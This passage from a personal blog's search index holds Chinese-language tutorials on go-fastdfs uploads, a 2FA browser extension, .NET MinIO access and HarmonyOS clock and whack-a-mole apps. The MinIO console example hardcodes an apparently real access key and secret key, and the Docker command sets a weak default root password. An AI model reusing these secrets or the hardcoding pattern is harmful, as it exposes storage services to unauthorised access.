winhttps://blog.csdn.net/weixin_52799373/article/details/139039181 win测通道xxxhttps://knowledge.broadcom.com/external/article?legacyId=79832","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"Linux","slug":"Linux","permalink":"https://banjinmei.github.io/tags/Linux/"},{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"VM","slug":"VM","permalink":"https://banjinmei.github.io/tags/VM/"}],"author":"mu"},{"title":"Go-fastdfs","slug":"Go-fastdfs","date":"2024-06-19T15:58:46.000Z","updated":"2024-12-10T14:31:47.819Z","comments":true,"path":"2024/06/19/Go-fastdfs/","permalink":"https://banjinmei.github.io/2024/06/19/Go-fastdfs/","excerpt":"","text":"go-fastdfsGo-fastdfs 是简单、可靠、高效的分布式文件系统。 安装https://sjqzhang.github.io/go-fastdfs/#character orhttps://github.com/sjqzhang/go-fastdfs/releases 启动1./fileserver server docker部署 1docker run --network=host --name fastdfs -v /data/fastdfs_data:/data -p 8080:8080 -e GO_FASTDFS_DIR=/data sjqzhang/go-fastdfs .NET参考java实现https://sjqzhang.github.io/go-fastdfs/usage.html#java 12345678910111213141516171819202122232425262728293031323334353637383940private static readonly string UPLOAD_PATH2 = &quot;go-fastdfs地址XXX:XX&quot;; [HttpPost(&quot;FormFile&quot;)] public async Task&lt;string&gt; UploadGo(IFormFile file) &#123; if (file == null || file.Length == 0) &#123; return &quot;File is empty&quot;; &#125; string result = string.Empty; try &#123; using (var httpClient = new HttpClient()) &#123; using (var form = new MultipartFormDataContent()) &#123; var streamContent = new StreamContent(file.OpenReadStream()); streamContent.Headers.Add(&quot;Content-Disposition&quot;, $&quot;form-data; name=\\&quot;file\\&quot;; filename=\\&quot;&#123;file.FileName&#125;\\&quot;&quot;); form.Add(streamContent, &quot;file&quot;, file.FileName); form.Add(new StringContent(&quot;default&quot;), &quot;scene&quot;); form.Add(new StringContent(&quot;20240619&quot;), &quot;path&quot;); form.Add(new StringContent(&quot;json2&quot;), &quot;output&quot;); form.Add(new StringContent(&quot;upload&quot;), &quot;submit&quot;); var response = await httpClient.PostAsync(UPLOAD_PATH2, form);//await result = await response.Content.ReadAsStringAsync();//await Console.WriteLine($&quot;resp: &#123;response&#125;&quot;); &#125; &#125; &#125; catch (Exception e) &#123; Console.WriteLine(e.ToString()); &#125; return result; &#125; “url”: “http://xxx/group1/20240619/test1619.png?name=test1619.png&amp;download=1“ python1234567import requestsurl = &#x27;http://xxx:xx/group1/upload&#x27;files = &#123;&#x27;file&#x27;: open(&#x27;resized240525.jpg&#x27;, &#x27;rb&#x27;)&#125;options=&#123;&#x27;output&#x27;:&#x27;json&#x27;,&#x27;path&#x27;:&#x27;20240619&#x27;,&#x27;scene&#x27;:&#x27;&#x27;,&#x27;filename&#x27;:&#x27;test123.jpg&#x27;&#125; r = requests.post(url,data=options, files=files)print(r.text) 集群12&quot;peers&quot;: [&quot;http://192.168.44.128:8080&quot;,&quot;http://192.168.31.36:8080&quot;], web managego-fastdfs web - java1.安装下载地址：https://github.com/perfree/go-fastdfs-web/releases/download/v1.3.4/go-fastdfs-web-1.3.4.tar.gz到 官方下载页面 下载所需的版本(带jre或者不带jre) 1wget https://github.com/perfree/go-fastdfs-web/releases/download/v1.3.4/go-fastdfs-web-1.3.4.tar.gz 项目地址：https://github.com/perfree/go-fastdfs-web各打包版本下载地址：https://github.com/perfree/go-fastdfs-web/releases 2、解压运行：123tar -zxvf go-fastdfs-web-1.3.4.tar.gzcd /opt/go-fastdfs-web/./goFastDfsWeb.sh start 也可以 (java环境)： 1java -jar go-fastdfs-web.jar 3、访问监控页面：ip:8088 GoFastDfs-Web管理平台安装页面安装完即可使用 go_web_版本https://github.com/perfree/go-fastdfs-web-go","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"2FA-Enable two-factor authentication (2FA)","slug":"2FA-Enable-two-factor-authentication-2FA","date":"2024-06-18T15:40:12.000Z","updated":"2024-06-18T15:47:40.000Z","comments":true,"path":"2024/06/18/2FA-Enable-two-factor-authentication-2FA/","permalink":"https://banjinmei.github.io/2024/06/18/2FA-Enable-two-factor-authentication-2FA/","excerpt":"","text":"开源免费的Authenticator: 2FA Client，支持多种浏览器。 开源地址：Authenticator-Extensionhttps://github.com/Authenticator-Extension/Authenticator Edge扩展：Authenticator: 2FA Client - Microsoft Edge Addonshttps://microsoftedge.microsoft.com/addons/detail/authenticator-2fa-client/ocglkepbibnalbgmbachknglpdipeoio Chrome扩展：身份验证器 - Chrome 应用商店 (google.com)https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai 安装好这个扩展程序以后，再次进入GitHub验证界面，等待二维码弹出。 二维码弹出以后，点击浏览器扩展，点击Authenticator: 2FA Client 点击二维码，选择指定区域，进行操作，等待代码就可以了。 Enable two-factor authentication (2FA)","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"github","slug":"github","permalink":"https://banjinmei.github.io/tags/github/"}],"author":"mu"},{"title":".NET MinIO","slug":"NET-MinIO","date":"2024-06-18T15:11:40.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/18/NET-MinIO/","permalink":"https://banjinmei.github.io/2024/06/18/NET-MinIO/","excerpt":"","text":"安装MinIOdocker 1docker run --name minio -p 9000:9000 -p 9090:9090 -d -e &quot;MINIO_ROOT_USER=minio&quot; -e &quot;MINIO_ROOT_PASSWORD=minio123&quot; -v /usr/local/minio-data:/data -v /usr/local/minio-config:/root/.minio minio/minio server data --console-address &quot;:9090&quot; --address &quot;:9000&quot; 后台创建 Buckets访问 localhost:9000 登陆后创建Buckets io617 创建密钥Access Keys add package1dotnet add package Minio 配置json12345678//...&quot;Minio&quot;: &#123; &quot;Endpoint&quot;: &quot;192.168.80.xx:9000&quot;,//&quot;localhost:9000&quot;, //90/service-account-credentials &quot;AccessKey&quot;: &quot;EctmxSNB9FqfW6UWxxx&quot;, &quot;SecretKey&quot;: &quot;frQhYoH1k7UphMxbwK2PiG2xKadzPjxxx&quot;, &quot;BucketName&quot;: &quot;io617&quot;&#125;,//... 服务类MinioService1234567891011121314151617181920212223242526272829303132333435363738394041424344public class MinioService&#123; private readonly MinioClient _minioClient; private readonly string _bucketName; public MinioService(IConfiguration configuration) &#123; var endpoint = configuration[&quot;Minio:Endpoint&quot;]; var accessKey = configuration[&quot;Minio:AccessKey&quot;]; var secretKey = configuration[&quot;Minio:SecretKey&quot;]; _bucketName = configuration[&quot;Minio:BucketName&quot;]; //http://localhost:9090/api/v1/service-account-credentials _minioClient = (MinioClient?)new MinioClient() .WithEndpoint(endpoint) .WithCredentials(accessKey, secretKey) .Build(); &#125; public async Task UploadFileAsync(string objectName, Stream data, long size, string contentType) &#123; await _minioClient.PutObjectAsync(new PutObjectArgs() .WithBucket(_bucketName) .WithObject(objectName) .WithStreamData(data) .WithObjectSize(size) .WithContentType(contentType)); &#125; public async Task&lt;Stream&gt; GetFileAsync(string objectName) &#123; var memoryStream = new MemoryStream(); await _minioClient.GetObjectAsync(new GetObjectArgs() .WithBucket(_bucketName) .WithObject(objectName) .WithCallbackStream((stream) =&gt; &#123; stream.CopyTo(memoryStream); &#125;)); memoryStream.Seek(0, SeekOrigin.Begin); return memoryStream; &#125;&#125; 注入服务1builder.Services.AddSingleton&lt;MinioService&gt;(); 使用服务1234public HomeController(ILogger&lt;HomeController&gt; logger,MinioService minioService)&#123; _minioService = minioService;//&#125; testcode1234567891011121314151617181920212223242526272829 [HttpGet] public IActionResult Upload() &#123; return View(); &#125; [HttpPost] public async Task&lt;IActionResult&gt; Upload(IFormFile file) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; using (var stream = file.OpenReadStream()) &#123; await _minioService.UploadFileAsync(file.FileName, stream, file.Length, file.ContentType); &#125; ViewBag.Message = &quot;File uploaded successfully!&quot;; &#125; return View(); &#125; [HttpGet] public async Task&lt;IActionResult&gt; Download(string fileName) &#123; var stream = await _minioService.GetFileAsync(fileName); return File(stream, &quot;application/octet-stream&quot;, fileName); &#125;//use https://localhost:7118/Home/download?filename=bx.png 12345678910@using (Html.BeginForm(&quot;Upload&quot;, &quot;Home&quot;, FormMethod.Post, new &#123; enctype = &quot;multipart/form-data&quot; &#125;))&#123; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt;&#125;&lt;div&gt; @ViewBag.Message&lt;/div&gt;&lt;/div&gt; or console 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//TESTstring endpoint = &quot;xxx:9000&quot;;//&quot;localhost:9000&quot;; // string accessKey = &quot;EctmxSNB9FqfW6UWrcAY&quot;; // Access Keystring secretKey = &quot;frQhYoH1k7UphMxbwK2PiG2xKadzPjTE3q9HgHHk&quot;; //Secret Keystring bucketName = &quot;io617&quot;; //Bucketstring filePath = &quot;D:\\\\UploadPath\\\\FileSystem\\\\files\\\\c.jpg&quot;;////.png&quot;; //var minioClient = (MinioClient?)new MinioClient() .WithEndpoint(endpoint) .WithCredentials(accessKey, secretKey) .Build();try &#123; // 上传文件 string fileName = Path.GetFileName(filePath); using (var fileStream = File.OpenRead(filePath)) &#123; var startTime = DateTime.Now; var filestream = fileStream; using (filestream) &#123; var file_write_size = filestream.Length; var putObjectArgs = new PutObjectArgs() .WithBucket(bucketName) .WithObject(&quot;obj2222&quot;) .WithStreamData(filestream) .WithObjectSize(filestream.Length) .WithContentType(&quot;application/octet-stream&quot;) .WithHeaders(null); minioClient.PutObjectAsync(putObjectArgs).ConfigureAwait(false);//await &#125; // minioClient.PutObject(bucketName, fileName, fileStream, fileStream.Length);&#125; Console.WriteLine($&quot;File &#123;fileName&#125; uploaded successfully&quot;);&#125;catch (Exception e)&#123; Console.WriteLine($&quot;Error: &#123;e.Message&#125;&quot;);&#125; 代码创建bucket1234567891011// code create bucketvar beArgs = new BucketExistsArgs() .WithBucket(bucket);bool found = await _minioClient.BucketExistsAsync(beArgs).ConfigureAwait(false);if (!found)&#123; var mbArgs = new MakeBucketArgs() .WithBucket(bucket); await _minioClient.MakeBucketAsync(mbArgs).ConfigureAwait(false);&#125; –https://min.io/docs/minio/linux/index.html?ref=con","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"HarmonyOS Next WorldTime  Whack Mole","slug":"HarmonyOS-TeachApp","date":"2024-06-15T15:58:57.000Z","updated":"2024-12-15T04:09:57.494Z","comments":true,"path":"2024/06/15/HarmonyOS-TeachApp/","permalink":"https://banjinmei.github.io/2024/06/15/HarmonyOS-TeachApp/","excerpt":"","text":"HarmonyOS Next WorldTime Whack Mole HarmonyOS应用 鸿蒙NEXT开发 世界时应用 打地鼠 环境Windows 11DevEco Studio 5.0.1 Release Version: 5.0.5.306HarmonyOS 5.0.1(13)ArkTS ArkUI API 13 WorldTime 世界时应用实现思路获取时区信息更新时间搜索功能 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191import &#123; i18n &#125; from &#x27;@kit.LocalizationKit&#x27; // 导入国际化模块，用于处理多语言import &#123; inputMethod &#125; from &#x27;@kit.IMEKit&#x27; // 导入输入法模块@ObservedV2 // 观察者装饰器，用于观察状态变化class CityTimeInfo &#123; // 定义城市时间信息类 @Trace cityName: string = &quot;&quot;; // 城市名称，初始为空字符串 @Trace currentTime: string = &quot;&quot;; // 当前时间，初始为空字符串 timeZone: i18n.TimeZone; // 时区属性 constructor(cityName: string, timeZone: i18n.TimeZone) &#123; // 构造函数，接收城市名称和时区 this.cityName = cityName; // 设置城市名称 this.timeZone = timeZone; // 设置时区 &#125; @Trace isVisible: boolean = true; // 是否可见，初始为true&#125;@Entry // 入口组件装饰器@Component // 组件装饰器struct WorldClockApp &#123; // 定义世界时钟应用组件 @State private searchText: string = &#x27;&#x27;; // 搜索文本，初始为空字符串 @State private cityTimeList: CityTimeInfo[] = []; // 城市时间信息列表，初始为空数组 private lineColor: string = &quot;#e6e6e6&quot;; // 边框颜色 private titleBackgroundColor: string = &quot;#f8f8f8&quot;; // 标题背景色 private textColor: string = &quot;#333333&quot;; // 文字颜色 private basePadding: number = 4; // 内边距 private lineWidth: number = 2; // 边框宽度 private rowHeight: number = 50; // 行高 private ratio: number[] = [1, 1]; // 列宽比例 private textSize: number = 14; // 基础字体大小 private updateIntervalId = 0; // 更新间隔ID updateAllCityTimes() &#123; // 更新所有城市的时间 const locale = i18n.System.getSystemLocale(); // 获取系统语言环境 for (const cityTime of this.cityTimeList) &#123; // 遍历城市时间列表 const timeZoneId: string = cityTime.timeZone.getID(); // 获取时区ID const calendar = i18n.getCalendar(locale); // 获取日历对象 calendar.setTimeZone(timeZoneId); // 设置日历的时区 // 获取当前时间的各个部分 const year = calendar.get(&quot;year&quot;).toString().padStart(4, &#x27;0&#x27;); // 年 const month = calendar.get(&quot;month&quot;).toString().padStart(2, &#x27;0&#x27;); // 月 const day = calendar.get(&quot;date&quot;).toString().padStart(2, &#x27;0&#x27;); // 日 const hour = calendar.get(&quot;hour_of_day&quot;).toString().padStart(2, &#x27;0&#x27;); // 小时 const minute = calendar.get(&quot;minute&quot;).toString().padStart(2, &#x27;0&#x27;); // 分钟 const second = calendar.get(&quot;second&quot;).toString().padStart(2, &#x27;0&#x27;); // 秒 // 更新城市的当前时间字符串 cityTime.currentTime = `$&#123;year&#125;年$&#123;month&#125;月$&#123;day&#125;日 $&#123;hour&#125;:$&#123;minute&#125;:$&#123;second&#125;`; &#125; &#125; onPageShow(): void &#123; // 页面显示时的处理 clearInterval(this.updateIntervalId); // 清除之前的定时器 this.updateIntervalId = setInterval(() =&gt; &#123; // 设置新的定时器 this.updateAllCityTimes(); // 每秒更新所有城市的时间 &#125;, 1000); &#125; onPageHide(): void &#123; // 页面隐藏时的处理 clearInterval(this.updateIntervalId); // 清除定时器 &#125; private highlightSearchText(cityTime: CityTimeInfo, keyword: string) &#123; // 高亮搜索文本 let text = cityTime.cityName // 获取城市名称 if (!keyword) &#123; // 如果没有关键词 cityTime.isVisible = true // 设置城市可见 return [text] // 返回城市名称 &#125; let segments: string[] = []; // 存储分段文本 let lastMatchEnd: number = 0; // 上一个匹配结束的位置 while (true) &#123; // 循环查找关键词 const matchIndex = text.indexOf(keyword, lastMatchEnd); // 查找关键词位置 if (matchIndex === -1) &#123; // 如果没有找到 segments.push(text.slice(lastMatchEnd)); // 添加剩余文本 break; // 退出循环 &#125; else &#123; segments.push(text.slice(lastMatchEnd, matchIndex)); // 添加匹配前的文本 segments.push(text.slice(matchIndex, matchIndex + keyword.length)); // 添加匹配的关键词 lastMatchEnd = matchIndex + keyword.length; // 更新最后匹配结束位置 &#125; &#125; cityTime.isVisible = (segments.indexOf(keyword) != -1) // 设置城市可见性 return segments; // 返回分段文本 &#125; aboutToAppear() &#123; // 组件即将出现时的处理 const timeZoneIds: Array&lt;string&gt; = i18n.TimeZone.getAvailableIDs(); // 获取可用时区ID列表 this.cityTimeList.push(new CityTimeInfo(&#x27;北京 (中国)&#x27;, i18n.getTimeZone())); // 添加北京的城市时间信息 //this.cityTimeList.push(new CityTimeInfo(&#x27;东京 (日本)&#x27;, i18n.getTimeZone())); // 添加北京的城市时间信息 //this.cityTimeList.push(new CityTimeInfo(&#x27;贝伦 (巴西)&#x27;, i18n.getTimeZone())); // 添加北京的城市时间信息 for (const id of timeZoneIds) &#123; // 遍历时区ID const cityDisplayName = i18n.TimeZone.getCityDisplayName(id.split(&#x27;/&#x27;)[1], &quot;zh-CN&quot;); // 获取城市显示名称 if (cityDisplayName) &#123; // 如果城市名称存在 this.cityTimeList.push(new CityTimeInfo(cityDisplayName, i18n.getTimeZone(id))); // 添加城市时间信息 &#125; &#125; this.updateAllCityTimes(); // 更新所有城市的时间 &#125; build() &#123; // 构建组件的UI Column(&#123; space: 0 &#125;) &#123; // 创建一个垂直列 Search(&#123; value: $$this.searchText &#125;)// 创建搜索框 .margin(this.basePadding)// 设置边距 .fontFeature(&quot;\\&quot;ss01\\&quot; on&quot;) // 设置字体特性 Column() &#123; // 创建一个列 Row() &#123; // 创建一行 Text(&#x27;城市&#x27;)// 显示“城市”文本 .height(&#x27;100%&#x27;)// 高度占满 .layoutWeight(this.ratio[0])// 设置布局权重 .textAlign(TextAlign.Center)// 文本居中 .fontSize(this.textSize)// 设置字体大小 .fontWeight(600)// 设置字体粗细 .fontColor(this.textColor) // 设置字体颜色 Line().height(&#x27;100%&#x27;).width(this.lineWidth).backgroundColor(this.lineColor) // 创建分隔线 Text(&#x27;时间&#x27;)// 显示“时间”文本 .height(&#x27;100%&#x27;)// 高度占满 .layoutWeight(this.ratio[1])// 设置布局权重 .textAlign(TextAlign.Center)// 文本居中 .fontSize(this.textSize)// 设置字体大小 .fontWeight(600)// 设置字体粗细 .fontColor(this.textColor) // 设置字体颜色 &#125;.height(this.rowHeight).borderWidth(this.lineWidth).borderColor(this.lineColor) // 设置行高和边框 .backgroundColor(this.titleBackgroundColor) // 设置背景色 &#125;.width(`100%`).padding(&#123; left: this.basePadding, right: this.basePadding &#125;) // 设置列宽和内边距 Scroll() &#123; // 创建可滚动区域 Column() &#123; // 创建一个列 ForEach(this.cityTimeList, (item: CityTimeInfo) =&gt; &#123; // 遍历城市时间列表 Row() &#123; // 创建一行 Text() &#123; // 创建文本 ForEach(this.highlightSearchText(item, this.searchText), (segment: string, index: number) =&gt; &#123; // 高亮搜索文本 ContainerSpan() &#123; // 创建容器 Span(segment)// 创建文本段 .fontColor(segment === this.searchText ? Color.White : Color.Black)// 设置字体颜色 .onClick(() =&gt; &#123; // 点击事件 console.info(`高亮文本被点击：$&#123;segment&#125;`); // 输出点击的文本 console.info(`点击索引：$&#123;index&#125;`); // 输出点击的索引 &#125;); &#125;.textBackgroundStyle(&#123; // 设置文本背景样式 color: segment === this.searchText ? Color.Red : Color.Transparent // 根据是否匹配设置背景色 &#125;); &#125;); &#125; .height(&#x27;100%&#x27;) // 高度占满 .layoutWeight(this.ratio[0]) // 设置布局权重 .textAlign(TextAlign.Center) // 文本居中 .fontSize(this.textSize) // 设置字体大小 .fontColor(this.textColor) // 设置字体颜色 Line().height(&#x27;100%&#x27;).width(this.lineWidth).backgroundColor(this.lineColor) // 创建分隔线 Text(item.currentTime)// 显示当前时间 .height(&#x27;100%&#x27;)// 高度占满 .layoutWeight(this.ratio[1])// 设置布局权重 .textAlign(TextAlign.Center)// 文本居中 .fontSize(this.textSize)// 设置字体大小 .fontColor(this.textColor) // 设置字体颜色 &#125; .height(this.rowHeight) // 设置行高 .borderWidth(&#123; left: this.lineWidth, right: this.lineWidth, bottom: this.lineWidth &#125;) // 设置边框宽度 .borderColor(this.lineColor) // 设置边框颜色 .visibility(item.isVisible ? Visibility.Visible : Visibility.None) // 根据可见性设置显示状态 &#125;) &#125;.width(`100%`).padding(&#123; left: this.basePadding, right: this.basePadding &#125;) // 设置宽度和内边距 &#125; .width(&#x27;100%&#x27;) // 设置宽度占满 .layoutWeight(1) // 设置布局权重 .align(Alignment.Top) // 对齐方式 .onScrollStart(() =&gt; &#123; // 滚动开始事件 this.onPageHide() // 页面隐藏处理 &#125;) .onScrollStop(() =&gt; &#123; // 滚动停止事件 this.onPageShow() // 页面显示处理 &#125;) .onTouch((event) =&gt; &#123; // 触摸事件 if (event.type == TouchType.Down) &#123; // 如果是按下事件 inputMethod.getController().stopInputSession() // 停止输入会话 &#125; &#125;) &#125; &#125;&#125; 打地鼠主要功能：地鼠组件：Hamster 结构体定外观，依单元格宽调尺寸。单元格 Cell：有地鼠显示状态及缩放选项，含 setSelectedTrueTime 设显示时间戳、checkTime 检是否超停留时间隐藏。游戏主组件 Index：维护核心状态如动画间隔等，有 startGame 与 endGame 方法初始化与重置数据。界面构建：Index 组件 build 方法定布局，含计时器、得分板及单元格。时间与显示逻辑：TextTimer 组件控时，定时选单元格显地鼠，点击地鼠增分并执行动画。用户交互：点击地鼠单元格得分，点击后地鼠隐藏且更新得分。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342//index.etsimport &#123; curves, window &#125; from &#x27;@kit.ArkUI&#x27; // 导入所需的库和模块// 定义地鼠组件@Componentstruct Hamster &#123; @Prop cellWidth: number // 定义一个属性，表示单元格的宽度 build() &#123; Stack() &#123; // 创建一个堆叠布局 // 身体 Text() .width(`$&#123;this.cellWidth / 2&#125;lpx`) // 设置宽度为单元格宽度的一半 .height(`$&#123;this.cellWidth / 3 * 2&#125;lpx`) // 设置高度为单元格高度的2/3 .backgroundColor(&quot;#b49579&quot;) // 设置背景颜色 .borderRadius(&#123; topLeft: &#x27;50%&#x27;, topRight: &#x27;50%&#x27; &#125;) // 设置圆角 .borderColor(&quot;#2a272d&quot;) // 设置边框颜色 .borderWidth(1) // 设置边框宽度 // 嘴巴 Ellipse() .width(`$&#123;this.cellWidth / 4&#125;lpx`) // 设置嘴巴的宽度 .height(`$&#123;this.cellWidth / 5&#125;lpx`) // 设置嘴巴的高度 .fillOpacity(1) // 设置填充不透明度 .fill(&quot;#e7bad7&quot;) // 设置填充颜色 .stroke(&quot;#563e3f&quot;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin(&#123; top: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 设置上边距 // 左眼睛 Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`) // 设置左眼睛的宽度 .height(`$&#123;this.cellWidth / 6&#125;lpx`) // 设置左眼睛的高度 .fillOpacity(1) // 设置填充不透明度 .fill(&quot;#313028&quot;) // 设置填充颜色 .stroke(&quot;#2e2018&quot;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 设置下边距和右边距 // 右眼睛 Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`) // 设置右眼睛的宽度 .height(`$&#123;this.cellWidth / 6&#125;lpx`) // 设置右眼睛的高度 .fillOpacity(1) // 设置填充不透明度 .fill(&quot;#313028&quot;) // 设置填充颜色 .stroke(&quot;#2e2018&quot;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 设置下边距和左边距 // 左眼瞳 Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`) // 设置左眼瞳的宽度 .height(`$&#123;this.cellWidth / 15&#125;lpx`) // 设置左眼瞳的高度 .fillOpacity(1) // 设置填充不透明度 .fill(&quot;#fefbfa&quot;) // 设置填充颜色 .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 设置下边距和右边距 // 右眼瞳 Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`) // 设置右眼瞳的宽度 .height(`$&#123;this.cellWidth / 15&#125;lpx`) // 设置右眼瞳的高度 .fillOpacity(1) // 设置填充不透明度 .fill(&quot;#fefbfa&quot;) // 设置填充颜色 .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 设置下边距和左边距 &#125;.width(`$&#123;this.cellWidth&#125;lpx`).height(`$&#123;this.cellWidth&#125;lpx`) // 设置组件的宽度和高度 &#125;&#125;// 定义单元格类@ObservedV2class Cell &#123; @Trace scaleOptions: ScaleOptions = &#123; x: 1, y: 1 &#125;; // 定义缩放选项 @Trace isSelected: boolean = false // true表示显示地鼠，false表示隐藏地鼠 cellWidth: number // 单元格宽度 selectTime: number = 0 // 选择时间 constructor(cellWidth: number) &#123; // 构造函数 this.cellWidth = cellWidth // 初始化单元格宽度 &#125; setSelectedTrueTime() &#123; // 设置选择时间 this.selectTime = Date.now() // 记录当前时间 this.isSelected = true // 设置为选中状态 &#125; checkTime(stayDuration: number) &#123; // 检查停留时间 if (this.isSelected) &#123; // 如果当前是选中状态 if (Date.now() - this.selectTime &gt;= stayDuration) &#123; // 如果停留时间超过设定值 this.selectTime = 0 // 重置选择时间 this.isSelected = false // 设置为未选中状态 &#125; &#125; &#125;&#125;// 定义文本计时器修饰符类class MyTextTimerModifier implements ContentModifier&lt;TextTimerConfiguration&gt; &#123; constructor() &#123;&#125; applyContent(): WrappedBuilder&lt;[TextTimerConfiguration]&gt; &#123; // 应用内容 return wrapBuilder(buildTextTimer) // 返回构建文本计时器的函数 &#125;&#125;// 构建文本计时器的函数@Builderfunction buildTextTimer(config: TextTimerConfiguration) &#123; Column() &#123; Stack(&#123; alignContent: Alignment.Center &#125;) &#123; // 创建一个堆叠布局，内容居中对齐 Circle(&#123; width: 150, height: 150 &#125;) // 创建一个圆形 .fill(config.started ? (config.isCountDown ? 0xFF232323 : 0xFF717171) : 0xFF929292) // 根据状态设置填充颜色 Column() &#123; Text(config.isCountDown ? &quot;倒计时&quot; : &quot;正计时&quot;).fontColor(Color.White) // 显示计时状态 Text( (config.isCountDown ? &quot;剩余&quot; : &quot;已经过去了&quot;) + (config.isCountDown ? (Math.max(config.count / 1000 - config.elapsedTime / 100, 0)).toFixed(0) // 计算剩余时间 : ((config.elapsedTime / 100).toFixed(0)) // 计算已过去时间 ) + &quot;秒&quot; ).fontColor(Color.White) // 显示时间 &#125; &#125; &#125;&#125;// 定义游戏主组件@Entry@Componentstruct Index &#123; @State animationIntervalCount: number = 0 // 动画间隔计数 @State appearanceCount: number = 4 // 每次出现的地鼠数量 @State animationInterval: number = 1000 // 地鼠出现的间隔时间 @State hamsterStayDuration: number = 1500 // 地鼠停留时间 @State gameDuration: number = 30000 // 游戏总时长 @State randomPositionIndex: number = 0 // 随机位置 @State cells: Cell[] = [] // 存储地鼠单元格 @State cellWidth: number = 100 // 单元格宽度 @State currentScore: number = 0 // 当前游戏得分 @State timerModifier: MyTextTimerModifier = new MyTextTimerModifier() // 计时器修饰符 countdownTimerController: TextTimerController = new TextTimerController() // 倒计时控制器 timerController: TextTimerController = new TextTimerController() // 正计时控制器 aboutToAppear(): void &#123; // 设置当前app以横屏方式显示 window.getLastWindow(getContext()).then((windowClass) =&gt; &#123; windowClass.setPreferredOrientation(window.Orientation.LANDSCAPE) // 设置为横屏 &#125;) // 显示10个地鼠坑位 for (let i = 0; i &lt; 10; i++) &#123; this.cells.push(new Cell(this.cellWidth)) // 初始化10个单元格 &#125; &#125; endGame() &#123; // 结束游戏 this.animationIntervalCount = 0 // 重置动画间隔计数 this.currentScore = 0 // 重置得分 for (let i = 0; i &lt; this.cells.length; i++) &#123; this.cells[i].isSelected = false // 隐藏所有地鼠 &#125; this.countdownTimerController.reset() // 重置倒计时 this.timerController.reset() // 重置正计时 &#125; startGame() &#123; // 开始游戏 this.endGame() // 结束当前游戏，重置所有状态 this.countdownTimerController.start() // 启动倒计时控制器 this.timerController.start() // 启动正计时控制器 &#125; build() &#123; // 构建游戏界面 Row() &#123; // 创建一个水平布局 // 显示时间与得分 Column(&#123; space: 30 &#125;) &#123; // 创建一个垂直布局，设置间距 // 总时长 Column(&#123; space: 5 &#125;) &#123; // 创建一个垂直布局，设置间距 Text(`倒计时长(秒)`).fontColor(Color.Black) // 显示倒计时长度的文本 Counter() &#123; // 创建一个计数器组件 Text(`$&#123;this.gameDuration / 1000&#125;`) // 显示游戏总时长（秒） .fontColor(Color.Black) // 设置字体颜色 &#125; .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加按钮的点击事件 this.gameDuration += 1000; // 每次增加1秒 &#125;).onDec(() =&gt; &#123; // 减少按钮的点击事件 this.gameDuration -= 1000; // 每次减少1秒 this.gameDuration = this.gameDuration &lt; 1000 ? 1000 : this.gameDuration; // 确保最小值为1秒 &#125;); &#125; // 每次出现个数 Column(&#123; space: 5 &#125;) &#123; // 创建一个垂直布局，设置间距 Text(`每次出现(个)`).fontColor(Color.Black) // 显示每次出现的地鼠数量的文本 Counter() &#123; // 创建一个计数器组件 Text(`$&#123;this.appearanceCount&#125;`) // 显示每次出现的地鼠数量 .fontColor(Color.Black) // 设置字体颜色 &#125; .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加按钮的点击事件 this.appearanceCount += 1; // 每次增加1个 &#125;).onDec(() =&gt; &#123; // 减少按钮的点击事件 this.appearanceCount -= 1; // 每次减少1个 this.appearanceCount = this.appearanceCount &lt; 1 ? 1 : this.appearanceCount; // 确保最小值为1 &#125;); 